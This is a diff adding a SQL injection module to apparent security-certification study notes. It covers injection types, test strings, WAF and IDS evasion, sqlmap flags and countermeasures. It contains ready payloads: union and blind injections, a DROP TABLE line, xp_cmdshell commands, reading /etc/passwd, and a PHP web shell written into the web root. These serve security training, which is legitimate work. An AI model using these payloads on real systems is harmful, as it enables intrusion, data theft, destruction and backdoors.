@@ -1140,6 +1140,476 @@ hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt -w 3 --force
    - Enforce strong PSK complexity if using WPA2-PSK.
    - Regular passphrase rotation policy (e.g., every 90 days).
 
+## Module 15 - SQL Injection
+
+### 1. Overview of SQL Injections
+
+Main Types
+
+- Inbound (In-Band): Error-based, Union-based (same channel for injection + data retrieval)
+- Blind (Inferential): No direct data display; infer via boolean or time
+- Out-of-Band: Alternative channels (DNS, HTTP requests) for exfiltration
+
+------
+
+### 2. Common SQL Injection Techniques
+
+#### 2.1 Error-Based SQL Injections
+
+- Definition: Leverage DB error messages to reveal data structure.
+
+- Examples:
+
+  ```sql
+  ' OR 1=1; -- 
+  ```
+
+  If an error reveals table or column names, you confirm vulnerability.
+
+#### 2.2 Union-Based SQL Injections
+
+- Definition: Use `UNION` to combine results of multiple SELECT statements.
+
+- Example:
+
+  ```sql
+  ' UNION SELECT username, password FROM users; --
+  ```
+
+#### 2.3 Other In-Band Variants
+
+- **End-of-Line Commands** (`--`, `#`):
+
+  ```sql
+  ' OR '1'='1' -- 
+  ```
+
+- In-Line Comments (`/* ... */`)
+
+- Piggybacked Queries:
+
+  ```sql
+  ' ; DROP TABLE users; --
+  ```
+
+#### 2.4 Blind (Inferential) SQL Injection
+
+- Boolean-Based
+
+  ```sql
+  ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --
+  ```
+
+- Time-Based
+
+  ```sql
+  ' OR IF(1=1,SLEEP(5),0) --
+  ```
+
+#### 2.5 Out-of-Band SQL Injection
+
+- Definition: Use alternate channels (DNS requests, HTTP callbacks) for exfiltration.
+- Key Point: Attacker triggers DB queries that send data to a remote server.
+
+------
+
+### 3. SQL Injection Methodology
+
+#### 3.1 Information Gathering
+
+- Identify Data Entry Paths: Form fields, query parameters, headers, cookies.
+- Tools: Burp Suite, Tamper Dev.
+
+#### 3.2 Extracting Information via Error Messages
+
+- Parameter Tampering: Insert special characters to produce verbose errors.
+- Identify DB Engine: MySQL, MSSQL, Oracle, PostgreSQL each have distinct error outputs.
+
+#### 3.3 Testing for Vulnerabilities
+
+- Common Test Strings:
+
+  - `1' OR '1'='1`
+  - `' AND 1=2 --`
+
+- Additional Methods:
+
+  - Function Testing, Fuzz Testing, Static & Dynamic Testing
+
+#### 3.4 SQL Injection Black Box Pen Testing
+
+- Detecting SQL Injection Issues: Attempting crafted inputs.
+- Detecting Input Sanitization: Checking for special character filters.
+- Detecting Truncation Issues
+- Detecting SQL Modifications: WAF or filters rewriting queries.
+
+------
+
+### 4. Performing Different SQL Injections: Practical Examples
+
+- Error-Based
+
+  ```sql
+  http://target.com/index.php?id=1' AND 1=0--
+  ```
+
+- Union-Based
+
+  ```sql
+  http://target.com/index.php?id=1 UNION SELECT username, password FROM users--
+  ```
+
+- Blind (Boolean)
+
+  ```sql
+  http://target.com/index.php?id=1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --
+  ```
+
+- Blind (Time)
+
+  ```sql
+  http://target.com/index.php?id=1' OR IF(1=1,SLEEP(5),0)--
+  ```
+
+------
+
+### 5. Common SQL Keywords
+
+| Keyword       | Purpose                                  |
+| ------------- | ---------------------------------------- |
+| `SELECT`      | Retrieve data from tables                |
+| `FROM`        | Specify table(s)                         |
+| `WHERE`       | Filter rows                              |
+| `UNION`       | Combine multiple SELECT results          |
+| `INSERT`      | Add new records                          |
+| `UPDATE`      | Modify existing records                  |
+| `DELETE`      | Remove existing records                  |
+| `DROP`        | Delete tables or databases               |
+| `CREATE`      | Create DB objects                        |
+| `ALTER`       | Modify DB schema                         |
+| `EXEC`        | Execute stored procedures (MSSQL)        |
+| `xp_cmdshell` | Execute OS commands (MSSQL)              |
+| `REGEXP`      | Pattern matching (MySQL, etc.)           |
+| `LIKE`        | Pattern matching                         |
+| `LIMIT`       | Restrict number of returned rows (MySQL) |
+| `ORDER BY`    | Sort result set                          |
+| `GROUP BY`    | Group rows for aggregate functions       |
+
+------
+
+### 6. Bypassing Firewalls to Perform SQL Injection
+
+Each method below includes a short description and example:
+
+1. Normalization Method
+
+   - Idea: Rewrite or normalize the query to bypass naive signature-based filtering.
+
+   - Example: Changing case or spacing:
+
+     ```sql
+     SeLeCt * FrOm users 
+     ```
+
+     The firewall might only filter `SELECT FROM`.
+
+2. HPP (HTTP Parameter Pollution) Technique
+
+   - Idea: Send multiple parameters with the same name to confuse filters.
+
+   - Example:
+
+     ```
+     http://target.com/index.php?id=1&id=2
+     ```
+
+     The application or WAF might parse `id`
+
+      differently, potentially enabling injection.
+
+3. HPF (HTTP Parameter Fragmentation) Technique
+
+   - Idea: Split parameters across multiple fragments to hide malicious input.
+
+   - Example:
+
+     ```
+     GET /index.php?i
+     d=1' OR '1'='1 HTTP/1.1
+     ```
+
+     The firewall might fail to reassemble `id`.
+
+4. Blind SQL Injection
+
+   - Idea: Use boolean/time methods that do not rely on direct error messages.
+
+   - Example:
+
+     ```
+     http://target.com/product.php?id=1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --
+     ```
+
+     No direct error message, but page behavior changes.
+
+5. Signature Bypass
+
+   - Idea: Obfuscate known injection signatures (`UNION`, `SELECT`, etc.) using comments or string manipulations.
+
+   - Example:
+
+     ```sql
+     'UN//ION SEL//ECT user, pass FR//OM users--
+     ```
+
+     Breaks typical pattern matching in WAF filters.
+
+6. Buffer Overflow Method
+
+   - Idea: Overload the input buffer with excessive or malformed input, tricking the system or firewall.
+
+   - Example:
+
+     ```
+     id=<very_long_string_of_chars>...'%20OR%20'1'='1
+     ```
+
+     If the WAF crashes or mishandles large input, it may fail to filter the payload.
+
+7. CRLF Technique
+
+   - Idea: Inject carriage return (`\r`) and line feed (`\n`) to alter HTTP headers or queries.
+
+   - Example (URL-encoded):
+
+     ```
+     http://target.com/index.php?id=1%0d%0aSELECT%20*%20FROM%20users--
+     ```
+
+     This might break the parser’s expected structure.
+
+8. Integration Method
+
+   - Idea: Merge malicious payload with legitimate data in ways the firewall does not detect.
+
+   - Example:
+
+     ```
+     http://target.com/search?query=<script>alert()</script>&ref=' OR 1=1--
+     ```
+
+     The injection is “integrated” with normal script tags or other data to hide in plain sight.
+
+------
+
+### 7. Interacting with the Operating System
+
+- OS Shell via DB
+
+  - Some DB engines (e.g., MSSQL) allow commands via `xp_cmdshell`.
+
+  - Example:
+
+    ```sql
+    '; EXEC xp_cmdshell 'dir C:\'; --
+    ```
+
+- File System Access
+
+  - Use MySQL’s `LOAD_FILE()`, or MSSQL commands.
+
+  - Example (MySQL):
+
+    ```sql
+    SELECT LOAD_FILE('/etc/passwd');
+    ```
+
+------
+
+### 8. Creating Server Backdoors Using SQL Injection
+
+- Getting OS Shell
+
+  - Inject a PHP web shell if DB user can write files.
+
+  - Example:
+
+    ```sql
+    SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+    ```
+
+- Finding Directory Structure
+
+  - Example (MySQL):
+
+    ```sql
+    SELECT @@datadir;
+    ```
+
+- Database Backdoor
+
+  - Malicious triggers or stored procedures that run automatically.
+
+------
+
+### 9. `sqlmap` Usage Notes
+
+| Parameter         | Meaning                                                 |
+| ----------------- | ------------------------------------------------------- |
+| `-u`              | Target URL, e.g., `-u "http://site.com/index.php?id=1"` |
+| `--data`          | POST data                                               |
+| `--dbs`           | Enumerate databases                                     |
+| `--tables`        | Enumerate tables in a DB                                |
+| `--columns`       | Enumerate columns in a table                            |
+| `--dump`          | Dump database table entries                             |
+| `--banner`        | Retrieve DB banner info                                 |
+| `--current-user`  | Show current DB user                                    |
+| `--current-db`    | Show current DB name                                    |
+| `--os-shell`      | Attempt to get an interactive OS shell (if supported)   |
+| `--technique=...` | Specify injection techniques (`B`, `E`, `U`, `T`, `S`)  |
+| `--level=...`     | Set the test level                                      |
+| `--risk=...`      | Set the risk level                                      |
+| `--random-agent`  | Use a random HTTP User-Agent header                     |
+
+#### Usage Examples
+
+- Union-Based
+
+  ```bash
+  sqlmap -u "http://target.com/index.php?id=1" --technique=U --dump
+  ```
+
+- Error-Based
+
+  ```bash
+  sqlmap -u "http://target.com/item.php?item=1" --technique=E --columns
+  ```
+
+- Blind (Time-Based)
+
+  ```bash
+  sqlmap -u "http://target.com/search.php?q=test" --technique=T --time-sec=5
+  ```
+
+------
+
+### 10. Evasion Techniques (IEDS Signature Evasion)
+
+Short explanation + example:
+
+1. Inline Command
+
+   - Chain commands inline (e.g., with `;`).
+
+   - Example:
+
+     ```sql
+     ' ; DROP TABLE users; --
+     ```
+
+2. Char Encoding
+
+   - Use alternative encodings (UTF-8, etc.) to mask payload.
+
+   - Example:
+
+     ```
+     %c2%a3 or other unicode transformations
+     ```
+
+3. String Concatenation
+
+   - Break strings to evade filters.
+
+   - Example:
+
+     ```sql
+     'un'+'ion sel'+'ect'
+     ```
+
+4. Obfuscated Code
+
+   - Insert comments or random spacing.
+
+   - Example:
+
+     ```sql
+     SELECT/*comment*/password FROM/*comment*/users
+     ```
+
+5. Manipulating White Space
+
+   - Use tabs, line breaks, or comment blocks.
+
+   - Example:
+
+     ```sql
+     UN//ION//SELECT
+     ```
+
+6. Hex Encoding
+
+   - Convert payload to hex.
+
+   - Example (MySQL):
+
+     ```sql
+     SELECT x'68656C6C6F'  -- 'hello'
+     ```
+
+7. Sophisticated Matches
+
+   - Split known patterns with `||`, etc.
+
+   - Example:
+
+     ```sql
+     UN||ION SEL||ECT ...
+     ```
+
+8. URL Encoding
+
+   - Encode special chars (`' -> %27`, space -> `%20`).
+
+   - Example:
+
+     ```
+     http://target.com?id=%27%20OR%20%271%27%3D%271
+     ```
+
+9. Null Byte
+
+   - `%00` can terminate strings or bypass certain checks.
+
+10. Case Variation
+
+    - Changing letter cases: `SeLeCt`, `UnIon`.
+
+11. IP Fragmentation
+
+    - Split IP packets so WAF struggles to reconstruct the payload.
+
+------
+
+### 11. Countermeasures
+
+- Database-Level Hardening
+  - Restrict privileges
+  - Disable dangerous stored procedures (e.g., `xp_cmdshell`)
+  - Use secure defaults
+- Application-Level Protections
+  - Parameterized Queries/Prepared Statements
+  - ORMs (built-in escaping)
+  - Whitelist input validation
+- Detection
+  - Regex-based checks
+  - IDS/WAF signature and anomaly detection
+- Best Practices
+  - Least Privilege principle
+  - Escape/Sanitize all user input
+  - Regular Audits and code reviews
+  - Keep software patched and updated
+
 # Questions Pack
 
 Ces questions sont issues du site Exam
